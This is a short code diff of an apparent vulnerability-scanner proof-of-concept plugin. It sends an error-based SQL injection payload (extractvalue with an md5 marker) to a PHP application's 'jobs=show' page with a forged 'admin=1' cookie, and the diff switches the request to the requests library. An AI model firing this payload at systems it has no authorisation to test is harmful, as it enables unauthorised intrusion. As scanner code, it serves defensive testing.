@@ -35,12 +35,14 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
             payload = '/index.php?jobs=show&label_hf[1%27%20and%20extractvalue(1,concat(0x5c,md5(3.1415)))%23][2]=asd'
-            cookie = 'admin=1'
+            header = {
+                "Cookie" : 'admin=1'
+            }
             target = arg + payload
-            code, head, res, errcode, final_url = hh.http('-b %s %s' % (cookie,target))
+            req = requests.get(target, headers=header)
                        
-            if code == 200:  
-                m = re.search('63e1f04640e83605c1d177544a5a0488', res)
+            if req.status_code == 200:  
+                m = re.search('63e1f04640e83605c1d177544a5a0488', req.text)
                 if m:
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
